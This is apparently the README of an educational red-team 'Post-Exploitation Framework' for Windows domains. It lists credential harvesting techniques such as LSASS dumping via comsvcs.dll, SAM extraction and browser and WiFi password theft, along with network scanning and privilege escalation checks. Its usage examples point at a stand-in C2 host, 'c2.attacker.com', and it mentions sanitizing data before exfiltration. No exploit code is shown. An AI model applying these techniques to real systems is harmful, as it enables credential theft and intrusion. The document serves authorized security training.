# Post-Exploitation Framework

**Professional-Grade Automated Reconnaissance and Credential Harvesting for Authorized Red Team Operations**

A comprehensive, modular framework for systematic post-exploitation operations. This framework automates the complete reconnaissance workflow that professional red teamers execute after gaining initial access to a Windows environment.

## Overview

The Post-Exploitation Framework automates six critical phases of post-exploitation operations:

1. **Domain Enumeration** - Comprehensive Active Directory reconnaissance
2. **Credential Harvesting** - Multiple techniques for credential extraction
3. **Network Mapping** - Internal network discovery and service identification
4. **Sensitive Data Discovery** - Location of high-value targets and IP
5. **Privilege Escalation** - Automated identification of escalation paths
6. **Target Profiling** - Compilation of findings into actionable intelligence

## Why This Matters

After gaining initial access, most operators waste valuable time running commands manually. This framework embodies professional operational tradecraft:

- **Systematic** - No missed reconnaissance steps
- **Documented** - Every finding tracked for reporting
- **Efficient** - Automated execution saves hours
- **Comprehensive** - Multiple techniques for maximum coverage
- **Professional** - Production-ready code with proper error handling

## Features

### Core Capabilities

- ‚úÖ **Modular Architecture** - 11 specialized modules across 5 operational categories
- ‚úÖ **Comprehensive Coverage** - 20+ AD enumeration commands, 10+ credential techniques
- ‚úÖ **Findings Management** - Structured storage and retrieval of all discoveries
- ‚úÖ **Script Generation** - Automated PowerShell script creation for offline execution
- ‚úÖ **Session Tracking** - Complete operation state and timing management
- ‚úÖ **Professional CLI** - Full command-line interface with multiple operational modes

### Operational Modules

#### Domain Enumeration (20+ Commands)
- Complete AD forest/domain information
- User, computer, and group discovery
- Service principal account identification
- GPO and trust enumeration
- Privileged group membership analysis

#### Credential Harvesting (10+ Techniques)
- LSASS memory dumping (comsvcs.dll method)
- SAM/SYSTEM registry extraction
- Browser credential extraction (Chrome, Edge, Firefox)
- RDP saved credential discovery
- WiFi password extraction
- Windows Credential Manager dumping
- AutoLogon credential checks
- PowerShell history mining

#### Network Mapping
- Subnet discovery and ARP cache analysis
- Fast ping sweeps (parallel execution)
- Multi-port service scanning
- SMB share enumeration
- Service identification and mapping

#### Sensitive Data Discovery
- Financial document search
- Credential file location
- Database file discovery
- Configuration file analysis
- Source code with hardcoded secrets
- Certificate and private key discovery
- Backup file identification
- Cloud sync folder enumeration

#### Privilege Escalation (10+ Checks)
- Unquoted service path detection
- Weak service permissions
- Registry permission analysis
- AlwaysInstallElevated checks
- AutoLogon credential discovery
- Scheduled task permissions
- Writable PATH directories
- Token privilege analysis

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/post-exploitation-framework.git
cd post-exploitation-framework

# No dependencies required - pure Python 3.6+
# Optional: Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

## Quick Start

### Basic Usage

```bash
# Run complete post-exploitation workflow
python3 src/post_exploit_cli.py --session engagement-2024 --c2 c2.attacker.com

# Run specific phase only
python3 src/post_exploit_cli.py --phase domain-enum --session test

# Generate scripts for offline execution
python3 src/post_exploit_cli.py --generate-scripts --output ./scripts
```

### Programmatic Usage

```python
from post_exploitation import PostExploitationHandler

# Initialize handler
handler = PostExploitationHandler(
    session_id="engagement-2024",
    c2_server="c2.attacker.com"
)

# Execute complete workflow
success = handler.execute_post_exploitation()

# Get operation summary
summary = handler.get_operation_summary()
print(f"Credentials found: {summary['findings']['total_credentials']}")
print(f"Network hosts: {summary['findings']['total_hosts']}")
```

### Individual Module Usage

```python
from post_exploitation.modules import (
    DomainEnumerator,
    CredentialHarvester,
    NetworkMapper,
    SensitiveDataFinder,
    PrivilegeEscalator
)

# Domain enumeration only
domain_enum = DomainEnumerator()
script = domain_enum.generate_enumeration_script()
print(script)

# Credential harvesting only
cred_harvest = CredentialHarvester()
non_admin_techniques = cred_harvest.get_non_admin_techniques()
for technique in non_admin_techniques:
    print(f"{technique.name} - Stealth: {technique.stealth_level}")

# Privilege escalation only
priv_esc = PrivilegeEscalator()
high_severity = priv_esc.get_high_severity_checks()
for check in high_severity:
    print(f"{check.name} - {check.description}")
```

## Project Structure

```
post_exploitation_framework/
‚îú‚îÄ‚îÄ src/
‚îÇ   ‚îú‚îÄ‚îÄ post_exploitation/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ core/
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ session.py              # Session management
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ findings.py             # Findings storage
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ modules/
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ domain_enum.py          # AD enumeration
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ credential_harvest.py   # Credential extraction
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ network_mapping.py      # Network discovery
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ sensitive_data.py       # Data search
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ privilege_escalation.py # PrivEsc checks
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ handlers/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ __init__.py
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ post_exploit_handler.py # Main orchestration
‚îÇ   ‚îî‚îÄ‚îÄ post_exploit_cli.py             # Command-line interface
‚îú‚îÄ‚îÄ tests/                              # Unit tests
‚îú‚îÄ‚îÄ docs/                               # Additional documentation
‚îú‚îÄ‚îÄ examples/                           # Usage examples
‚îî‚îÄ‚îÄ README.md                           # This file
```

## Architecture

### Design Philosophy

1. **Modular Design** - Each phase is independent and reusable
2. **Structured Findings** - Centralized storage with categorization
3. **Session Management** - Complete operation state tracking
4. **Script Generation** - PowerShell scripts for manual execution
5. **Production Ready** - Proper error handling and logging

### Module Interactions

```
PostExploitationHandler (Orchestrator)
    ‚îÇ
    ‚îú‚îÄ‚îÄ Session (State Tracking)
    ‚îú‚îÄ‚îÄ FindingsManager (Data Storage)
    ‚îÇ
    ‚îú‚îÄ‚îÄ DomainEnumerator (AD Recon)
    ‚îú‚îÄ‚îÄ CredentialHarvester (Cred Extraction)
    ‚îú‚îÄ‚îÄ NetworkMapper (Network Discovery)
    ‚îú‚îÄ‚îÄ SensitiveDataFinder (Data Search)
    ‚îî‚îÄ‚îÄ PrivilegeEscalator (PrivEsc Checks)
```

## Operational Security

### Built-in OpSec Features

- **Stealth Ratings**: Each technique rated for detectability
- **Non-Admin First**: Prioritizes techniques not requiring elevation
- **Selective Execution**: Choose specific phases or techniques
- **Offline Scripts**: Generate scripts for manual execution
- **Findings Tracking**: Complete audit trail for reporting

### Best Practices

1. **Start Non-Intrusive** - Begin with passive reconnaissance
2. **Escalate Gradually** - Move to active techniques systematically
3. **Track Everything** - Use findings manager for all discoveries
4. **Generate Scripts** - Review before execution on target
5. **Clean Findings** - Sanitize data before exfiltration

## Usage Examples

### Complete Workflow

```bash
python3 src/post_exploit_cli.py \
    --session client-engagement-2024 \
    --c2 c2.attacker.com \
    --phase all \
    --verbose
```

### Domain Enumeration Only

```bash
python3 src/post_exploit_cli.py \
    --phase domain-enum \
    --session domain-recon
```

### Generate Scripts for Manual Execution

```bash
python3 src/post_exploit_cli.py \
    --generate-scripts \
    --output ./engagement_scripts
```

This generates 5 PowerShell scripts:
- `01_domain_enumeration.ps1`
- `02_credential_harvesting.ps1`
- `03_network_mapping.ps1`
- `04_sensitive_data_search.ps1`
- `05_privilege_escalation.ps1`

## Module Capabilities

### Domain Enumeration
- **Total Commands**: 20+
- **Categories**: Domain, Users, Computers, Groups, GPO, Trusts
- **Priority Levels**: Critical, Important, Nice-to-have

### Credential Harvesting
- **Total Techniques**: 10+
- **Admin Required**: 3 techniques
- **Non-Admin**: 7+ techniques
- **Stealth Levels**: High, Medium, Low

### Network Mapping
- **Total Tasks**: 9
- **Common Ports**: 19 ports scanned
- **Categories**: Discovery, Scanning, Service Enumeration

### Sensitive Data Discovery
- **Total Categories**: 9
- **Search Patterns**: Financial, Credentials, Database, Config, Source, Certs, Backups
- **Keyword Matching**: Context-aware content search

### Privilege Escalation
- **Total Checks**: 10+
- **Severity Levels**: High, Medium, Low
- **Categories**: Services, Registry, Credentials, Tasks, DLL Hijacking

## Findings Management

All discoveries are automatically categorized and stored:

```python
# Findings structure
findings = {
    'credentials': [],           # Discovered credentials
    'network': {
        'live_hosts': [],        # Network hosts
        'open_ports': [],        # Service ports
        'services': []           # Identified services
    },
    'systems': [],               # System information
    'shares': [],                # Network shares
    'sensitive_files': [],       # High-value files
    'privilege_paths': [],       # Escalation opportunities
    'domain_info': {},           # AD information
    'users': [],                 # Domain users
    'computers': [],             # Domain computers
    'groups': []                 # Domain groups
}
```

Findings are automatically saved to JSON and can be exported as human-readable reports.

## Legal & Ethical Use

‚ö†Ô∏è **CRITICAL NOTICE** ‚ö†Ô∏è

This framework is designed **exclusively** for:
- Authorized penetration testing engagements
- Red team operations with explicit written permission
- Security research in controlled environments
- Educational purposes with proper authorization

**UNAUTHORIZED USE IS ILLEGAL**

The developers assume no liability for misuse. Users are responsible for:
- Obtaining proper authorization before use
- Complying with all applicable laws and regulations
- Using the framework only within authorized scope
- Maintaining ethical standards in all operations

## Development Roadmap

### Planned Features

- [ ] Linux/macOS platform support
- [ ] Extended credential extraction (KeePass, LastPass, etc.)
- [ ] Automated report generation (PDF, HTML)
- [ ] Integration with popular C2 frameworks
- [ ] Real-time C2 execution mode
- [ ] Docker containerization for testing

### Known Limitations

- Currently Windows-focused (AD environments)
- Simulates command execution (production would integrate with C2)
- Limited to PowerShell-based techniques
- Requires manual script execution on target

## Contributing

Contributions welcome! Please see CONTRIBUTING.md for guidelines.

## Credits

Developed for the **"30 Days of Red Team"** series - a comprehensive cybersecurity education program teaching professional red team methodologies.

**Author**: Thomas (Red Team Operator)
**Series**: [30 Days of Red Team on Medium](https://medium.com/@yourusername)
**GitHub**: [Red Team Toolkit](https://github.com/yourusername/red-team-toolkit)

## License

This project is licensed under the MIT License - see LICENSE file for details.

**Remember**: With great power comes great responsibility. Use wisely, use legally, use ethically.

---

**Built by operators, for operators. üî¥**
